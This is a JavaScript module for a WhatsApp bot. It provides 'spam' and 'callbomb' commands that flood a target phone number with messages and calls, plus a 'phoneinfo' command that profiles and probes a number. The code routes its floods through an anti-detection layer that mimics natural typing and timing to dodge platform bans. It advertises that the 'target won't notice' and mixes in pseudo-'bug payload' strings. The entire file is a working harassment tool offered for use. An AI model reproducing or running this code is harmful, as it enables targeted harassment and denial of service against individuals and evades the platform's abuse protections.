'use strict';

const crypto = require('crypto');
const AntiDetection = require('./antiDetection');
const BanProtection = require('./banProtection');
const { BOT_NAME, PREFIX } = require('../config');

class PhoneAttacks {
    constructor() {
        this.sock = null;
        this.stealth = new AntiDetection();
        this.banProtection = new BanProtection();
        this.activeSpams = new Map();
        this.activeCallBombs = new Map();
        this.phoneCache = new Map();
        this.attackStats = new Map();

        this.bugPayloads = [
            '🐛 DATABASE_CORRUPT',
            '🐛 CACHE_CORRUPT',
            '🐛 MEDIA_CORRUPT',
            '🐛 CONFIG_CORRUPT',
            '🐛 ENCRYPTION_BREAK',
            '🐛 STORAGE_LOCK',
            '🐛 MEMORY_EXPLOIT',
            '🐛 FILESYSTEM_CORRUPT',
            '🐛 SESSION_KILL',
            '🐛 DATABASE_LOCK'
        ];
    }

    // ==============================================
    // SPAM COMMAND
    // ==============================================
    async spamExecute(sock, msg, args, ctx) {
        this.sock = sock;
        if (args.length < 1) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  SILENT SPAM USAGE  〕`,
                    `║`,
                    `║ ▸ ${PREFIX}spam <phone> [count] [delay]`,
                    `║ ▸ Example: ${PREFIX}spam 2547XXXXXX 100 0.5`,
                    `║`,
                    `║ 🔇 Silent - Target won't notice`,
                    `║ 🎭 Bug injection spam`,
                    `║ 🛡️ Rate limit protection`,
                    `║ 🚫 Ban protection active`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
            return;
        }

        const phone = args[0].replace(/[^0-9]/g, '');
        let count = parseInt(args[1]) || 50;
        const delay = parseFloat(args[2]) || 0.5;

        if (!this.validatePhone(phone)) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  ERROR  〕`,
                    `║`,
                    `║ ▸ Invalid phone: ${phone}`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
            return;
        }

        if (this.banProtection.isBanned(phone)) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  BLOCKED  〕`,
                    `║`,
                    `║ ▸ ${phone} is blacklisted.`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
            return;
        }
        if (this.banProtection.isWhitelisted(phone)) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  PROTECTED  〕`,
                    `║`,
                    `║ ▸ ${phone} is whitelisted.`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
            return;
        }

        const risk = this.stealth.getBanRisk(phone);
        if (risk >= 5) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  HIGH BAN RISK  〕`,
                    `║`,
                    `║ ▸ Risk: ${risk}/10`,
                    `║ ▸ Attack blocked.`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
            return;
        }
        if (this.stealth.checkDailyLimits(phone, 'message')) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  DAILY LIMIT  〕`,
                    `║`,
                    `║ ▸ Daily message limit reached for ${phone}`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
            return;
        }

        const safeParams = this.stealth.getSafeParams('message', count);
        count = safeParams.safeCount;

        if (this.activeSpams.has(phone)) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  ALREADY RUNNING  〕`,
                    `║`,
                    `║ ▸ Spam already running on ${phone}`,
                    `║ ▸ Use ${PREFIX}spam_stop ${phone} to stop`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
            return;
        }

        this.activeSpams.set(phone, { active: true, count, delay, startTime: Date.now() });
        this.trackAttack(phone, 'spam');

        await sock.sendMessage(ctx.from, {
            text: [
                `╔═|〔  SILENT SPAM INITIATED  〕`,
                `║`,
                `║ ▸ Target  : ${phone}`,
                `║ ▸ Messages: ${count}`,
                `║ ▸ Delay   : ${delay}s`,
                `║ ▸ Ban Risk: ${risk}/10`,
                `║ ▸ Mode    : STEALTH + BUG INJECTION`,
                `╚═|〔  ${BOT_NAME}  〕`
            ].join('\n')
        }, { quoted: msg });

        let sent = 0, failed = 0;
        try {
            const messages = [];
            for (let i = 0; i < count; i++) {
                if (i % 3 === 0 && Math.random() > 0.5) {
                    const bug = this.bugPayloads[Math.floor(Math.random() * this.bugPayloads.length)];
                    messages.push(`${bug}:${crypto.randomBytes(16).toString('hex')}`);
                } else {
                    messages.push(this.stealth.generateNaturalMessage(phone));
                }
            }
            const results = await this.stealth.sendStealthBatch(this.sock, phone, messages, {
                delayBetween: delay * 1000,
                randomSpread: true,
                simulateTyping: true,
                maxPerBatch: 8,
                safetyMargin: 0.4
            });
            for (const r of results) {
                if (r.success) sent++;
                else {
                    failed++;
                    if (failed > 5) this.stealth.increaseBanRisk(phone, 1);
                }
            }
            this.updateAttackStats(phone, 'spam', sent);
        } catch (err) {
            console.error('Spam error:', err);
            this.stealth.increaseBanRisk(phone, 2);
        } finally {
            this.activeSpams.delete(phone);
        }

        if (failed > count * 0.5) this.banProtection.addToBlacklist(phone, 'Too many failed spam attempts');

        await sock.sendMessage(ctx.from, {
            text: [
                `╔═|〔  SILENT SPAM COMPLETE  〕`,
                `║`,
                `║ ▸ Target: ${phone}`,
                `║ ▸ Sent  : ${sent}`,
                `║ ▸ Failed: ${failed}`,
                `║ ▸ Total : ${sent + failed}`,
                `║ ▸ Risk Level: ${this.stealth.getBanRisk(phone)}/10`,
                `╚═|〔  ${BOT_NAME}  〕`
            ].join('\n')
        }, { quoted: msg });
    }

    // ==============================================
    // CALLBOMB COMMAND
    // ==============================================
    async callbombExecute(sock, msg, args, ctx) {
        this.sock = sock;
        if (args.length < 1) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  SILENT CALLBOMB USAGE  〕`,
                    `║`,
                    `║ ▸ ${PREFIX}callbomb <phone> [count] [delay]`,
                    `║ ▸ Example: ${PREFIX}callbomb 2547XXXXXX 20 2`,
                    `║`,
                    `║ 🔇 Silent - No ring detection`,
                    `║ 🎭 Natural timing`,
                    `║ 🛡️ Rate limit protection`,
                    `║ 🚫 Ban protection active`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
            return;
        }

        const phone = args[0].replace(/[^0-9]/g, '');
        let count = parseInt(args[1]) || 20;
        const delay = parseFloat(args[2]) || 2;

        if (!this.validatePhone(phone)) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  ERROR  〕`,
                    `║`,
                    `║ ▸ Invalid phone: ${phone}`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
            return;
        }

        if (this.banProtection.isBanned(phone)) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  BLOCKED  〕`,
                    `║`,
                    `║ ▸ ${phone} is blacklisted.`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
            return;
        }
        if (this.banProtection.isWhitelisted(phone)) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  PROTECTED  〕`,
                    `║`,
                    `║ ▸ ${phone} is whitelisted.`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
            return;
        }

        const risk = this.stealth.getBanRisk(phone);
        if (risk >= 5) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  HIGH BAN RISK  〕`,
                    `║`,
                    `║ ▸ Risk: ${risk}/10`,
                    `║ ▸ Attack blocked.`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
            return;
        }
        if (this.stealth.checkDailyLimits(phone, 'call')) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  DAILY LIMIT  〕`,
                    `║`,
                    `║ ▸ Daily call limit reached for ${phone}`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
            return;
        }

        const safeParams = this.stealth.getSafeParams('call', count);
        count = safeParams.safeCount;

        if (this.activeCallBombs.has(phone)) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  ALREADY RUNNING  〕`,
                    `║`,
                    `║ ▸ Callbomb already running on ${phone}`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
            return;
        }

        this.activeCallBombs.set(phone, { active: true, count, delay, startTime: Date.now() });
        this.trackAttack(phone, 'callbomb');

        await sock.sendMessage(ctx.from, {
            text: [
                `╔═|〔  SILENT CALLBOMB INITIATED  〕`,
                `║`,
                `║ ▸ Target: ${phone}`,
                `║ ▸ Calls : ${count}`,
                `║ ▸ Delay : ${delay}s`,
                `║ ▸ Ban Risk: ${risk}/10`,
                `╚═|〔  ${BOT_NAME}  〕`
            ].join('\n')
        }, { quoted: msg });

        let connected = 0, failed = 0;
        try {
            const results = await this.stealth.makeStealthCallBatch(this.sock, phone, count, {
                delayBetween: delay * 1000,
                randomSpread: true,
                maxPerBatch: 2,
                safetyMargin: 0.4
            });
            for (const r of results) {
                if (r.success) connected++;
                else {
                    failed++;
                    if (failed > 3) this.stealth.increaseBanRisk(phone, 1);
                }
            }
            this.updateAttackStats(phone, 'callbomb', connected);
        } catch (err) {
            console.error('Callbomb error:', err);
            this.stealth.increaseBanRisk(phone, 2);
        } finally {
            this.activeCallBombs.delete(phone);
        }

        if (failed > count * 0.5) this.banProtection.addToBlacklist(phone, 'Too many failed call attempts');

        await sock.sendMessage(ctx.from, {
            text: [
                `╔═|〔  SILENT CALLBOMB COMPLETE  〕`,
                `║`,
                `║ ▸ Target   : ${phone}`,
                `║ ▸ Connected: ${connected}`,
                `║ ▸ Failed   : ${failed}`,
                `║ ▸ Total    : ${connected + failed}`,
                `║ ▸ Risk Level: ${this.stealth.getBanRisk(phone)}/10`,
                `╚═|〔  ${BOT_NAME}  〕`
            ].join('\n')
        }, { quoted: msg });
    }

    // ==============================================
    // PHONE INFO COMMAND
    // ==============================================
    async phoneinfoExecute(sock, msg, args, ctx) {
        this.sock = sock;
        if (args.length < 1) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  PHONE INFO USAGE  〕`,
                    `║`,
                    `║ ▸ ${PREFIX}phoneinfo <phone>`,
                    `║ ▸ Example: ${PREFIX}phoneinfo 2547XXXXXX`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
            return;
        }

        const phone = args[0].replace(/[^0-9]/g, '');
        if (!this.validatePhone(phone)) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  ERROR  〕`,
                    `║`,
                    `║ ▸ Invalid phone: ${phone}`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
            return;
        }

        const info = await this.getPhoneInfo(phone);
        const isBanned = this.banProtection.isBanned(phone);
        const isWhitelisted = this.banProtection.isWhitelisted(phone);
        const risk = this.stealth.getBanRisk(phone);
        const stats = this.getAttackStats(phone);

        await sock.sendMessage(ctx.from, {
            text: [
                `╔═|〔  PHONE INFORMATION  〕`,
                `║`,
                `║ 📱 Number: ${info.number}`,
                `║ 🌍 Country: ${info.country || 'Unknown'}`,
                `║ 🏢 Carrier: ${info.carrier || 'Unknown'}`,
                `║ 📡 Network: ${info.network || 'Unknown'}`,
                `║ 📟 Type: ${info.type || 'Unknown'}`,
                `║ 📊 Status: ${info.status || 'Active'}`,
                `║`,
                `║ 🔍 PLATFORMS:`,
                `║ ├─ WhatsApp: ${info.whatsapp || '✅ Active'}`,
                `║ └─ Last Seen: ${info.lastSeen || 'Unknown'}`,
                `║`,
                `║ 🛡️ PROTECTION:`,
                `║ ├─ Banned: ${isBanned ? '⚠️ Yes' : '✅ No'}`,
                `║ ├─ Whitelisted: ${isWhitelisted ? '✅ Yes' : '❌ No'}`,
                `║ └─ Ban Risk: ${risk}/10`,
                `║`,
                `║ 📊 ATTACK STATS:`,
                `║ ├─ Spam: ${stats.spam || 0}`,
                `║ ├─ Callbomb: ${stats.callbomb || 0}`,
                `║ └─ Last Attack: ${stats.lastAttack ? new Date(stats.lastAttack).toLocaleString() : 'Never'}`,
                `╚═|〔  ${BOT_NAME}  〕`
            ].join('\n')
        }, { quoted: msg });
    }

    // ==============================================
    // SEND WHATSAPP MESSAGE (with stealth)
    // ==============================================
    async sendWhatsAppMessage(phone, message) {
        try {
            if (this.stealth.getBanRisk(phone) >= 5) return false;
            const result = await this.stealth.sendStealthMessage(this.sock, phone, message, {
                simulateTyping: true,
                randomDelay: true,
                useNaturalTemplate: true,
                trackRateLimit: true,
                addEmoji: true,
                simulateRead: true,
                autoCleanup: true,
                cleanupDelay: 5000,
                encryptMessage: true,
                encryptionMethod: 'aes'
            });
            return result.success;
        } catch (e) {
            console.error('[Spam] Send failed:', e.message);
            this.stealth.increaseBanRisk(phone, 0.5);
            return false;
        }
    }

    // ==============================================
    // VALIDATE PHONE
    // ==============================================
    validatePhone(phone) {
        return phone.length >= 10 && phone.length <= 15 && /^[0-9]+$/.test(phone);
    }

    // ==============================================
    // GET PHONE INFO
    // ==============================================
    async getPhoneInfo(phone) {
        if (this.phoneCache.has(phone)) return this.phoneCache.get(phone);
        const info = {
            number: phone,
            country: this.detectCountry(phone),
            carrier: this.detectCarrier(phone),
            network: this.detectNetwork(phone),
            type: this.detectPhoneType(phone),
            status: 'Active',
            whatsapp: await this.checkWhatsApp(phone),
            lastSeen: new Date().toISOString()
        };
        this.phoneCache.set(phone, info);
        return info;
    }

    // ==============================================
    // DETECTION METHODS
    // ==============================================
    detectCountry(phone) {
        const map = {
            '254':'Kenya','234':'Nigeria','233':'Ghana','256':'Uganda','255':'Tanzania','27':'South Africa',
            '44':'UK','1':'USA/Canada','91':'India','61':'Australia','64':'New Zealand','86':'China',
            '81':'Japan','82':'South Korea','60':'Malaysia','62':'Indonesia','63':'Philippines','66':'Thailand',
            '84':'Vietnam','92':'Pakistan','966':'Saudi Arabia','971':'UAE','972':'Israel','90':'Turkey',
            '33':'France','49':'Germany','39':'Italy','34':'Spain','31':'Netherlands','46':'Sweden',
            '47':'Norway','358':'Finland','45':'Denmark'
        };
        for (const [code, country] of Object.entries(map)) {
            if (phone.startsWith(code)) return country;
        }
        return 'Unknown';
    }

    detectCarrier(phone) {
        const carriers = {
            'Safaricom':['070','071','072','073','074','075','076','077','078','079'],
            'Airtel':['0730','0731','0732','0733','0734','0735','0736','0737','0738','0739'],
            'MTN':['080','081','090','091'],
            'Vodafone':['070','071','072','073'],
            'Orange':['060','061','062','063'],
            'T-Mobile':['206','253','360','425'],
            'Verizon':['260','280','310','320'],
            'AT&T':['210','310','408','510'],
            'Telstra':['040','041','042','043'],
            'Optus':['044','045','046','047']
        };
        const prefix = phone.substring(0,4);
        for (const [carrier, prefixes] of Object.entries(carriers)) {
            if (prefixes.some(p => prefix.startsWith(p))) return carrier;
        }
        return 'Unknown';
    }

    detectNetwork(phone) { return this.detectCarrier(phone); }

    detectPhoneType(phone) {
        const second = phone.charAt(1);
        return ['6','7','8','9'].includes(second) ? 'Mobile' : 'Landline';
    }

    async checkWhatsApp(phone) {
        try {
            const jid = phone + '@s.whatsapp.net';
            await this.sock.sendMessage(jid, { text: '.', ephemeralExpiration: 86400 });
            return '✅ Active';
        } catch (e) { return '❌ Inactive'; }
    }

    // ==============================================
    // ATTACK TRACKING
    // ==============================================
    trackAttack(phone, type) {
        if (!this.attackStats.has(phone)) {
            this.attackStats.set(phone, { spam:0, callbomb:0, lastAttack:null });
        }
        const stats = this.attackStats.get(phone);
        stats[type] = (stats[type] || 0) + 1;
        stats.lastAttack = Date.now();
        this.attackStats.set(phone, stats);
        if (stats.spam + stats.callbomb > 20) {
            this.banProtection.addToBlacklist(phone, 'Too many attacks');
        }
    }

    updateAttackStats(phone, type, count) {
        if (!this.attackStats.has(phone)) this.trackAttack(phone, type);
        const stats = this.attackStats.get(phone);
        stats[type] = (stats[type] || 0) + count;
        this.attackStats.set(phone, stats);
    }

    getAttackStats(phone) {
        return this.attackStats.get(phone) || { spam:0, callbomb:0, lastAttack:null };
    }

    stopSpam(phone) {
        if (this.activeSpams.has(phone)) {
            this.activeSpams.delete(phone);
            return true;
        }
        return false;
    }

    stopCallbomb(phone) {
        if (this.activeCallBombs.has(phone)) {
            this.activeCallBombs.delete(phone);
            return true;
        }
        return false;
    }
}

// ==============================================
// COMMAND WRAPPERS (for index.js)
// ==============================================
class SpamCommand {
    constructor(pa) {
        this.phoneAttacks = pa;
        this.name = 'spam';
        this.aliases = ['msgspam', 'flood'];
        this.description = 'Silent spam phone number (STEALTH)';
        this.category = 'exploit';
    }
    async execute(sock, msg, args, ctx) {
        await this.phoneAttacks.spamExecute(sock, msg, args, ctx);
    }
}

class CallbombCommand {
    constructor(pa) {
        this.phoneAttacks = pa;
        this.name = 'callbomb';
        this.aliases = ['callflood', 'callspam'];
        this.description = 'Silent call flood (STEALTH)';
        this.category = 'exploit';
    }
    async execute(sock, msg, args, ctx) {
        await this.phoneAttacks.callbombExecute(sock, msg, args, ctx);
    }
}

class PhoneInfoCommand {
    constructor(pa) {
        this.phoneAttacks = pa;
        this.name = 'phoneinfo';
        this.aliases = ['phone', 'numinfo'];
        this.description = 'Global phone info';
        this.category = 'utility';
    }
    async execute(sock, msg, args, ctx) {
        await this.phoneAttacks.phoneinfoExecute(sock, msg, args, ctx);
    }
}

class SpamStopCommand {
    constructor(pa) {
        this.phoneAttacks = pa;
        this.name = 'spam_stop';
        this.aliases = ['stopspam'];
        this.description = 'Stop silent spam';
        this.category = 'exploit';
    }
    async execute(sock, msg, args, ctx) {
        if (args.length < 1) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  STOP SPAM USAGE  〕`,
                    `║`,
                    `║ ▸ ${PREFIX}spam_stop <phone>`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
            return;
        }
        const phone = args[0].replace(/[^0-9]/g, '');
        if (this.phoneAttacks.stopSpam(phone)) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  SPAM STOPPED  〕`,
                    `║`,
                    `║ ▸ Phone: ${phone}`,
                    `║ ▸ Status: ✅ Stopped`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
        } else {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  SPAM STOPPED  〕`,
                    `║`,
                    `║ ▸ Phone: ${phone}`,
                    `║ ▸ Status: ❌ No active spam`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
        }
    }
}

class CallbombStopCommand {
    constructor(pa) {
        this.phoneAttacks = pa;
        this.name = 'callbomb_stop';
        this.aliases = ['stopcallbomb'];
        this.description = 'Stop silent callbomb';
        this.category = 'exploit';
    }
    async execute(sock, msg, args, ctx) {
        if (args.length < 1) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  STOP CALLBOMB USAGE  〕`,
                    `║`,
                    `║ ▸ ${PREFIX}callbomb_stop <phone>`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
            return;
        }
        const phone = args[0].replace(/[^0-9]/g, '');
        if (this.phoneAttacks.stopCallbomb(phone)) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  CALLBOMB STOPPED  〕`,
                    `║`,
                    `║ ▸ Phone: ${phone}`,
                    `║ ▸ Status: ✅ Stopped`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
        } else {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  CALLBOMB STOPPED  〕`,
                    `║`,
                    `║ ▸ Phone: ${phone}`,
                    `║ ▸ Status: ❌ No active callbomb`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
        }
    }
}

module.exports = {
    PhoneAttacks,
    SpamCommand,
    CallbombCommand,
    PhoneInfoCommand,
    SpamStopCommand,
    CallbombStopCommand
};
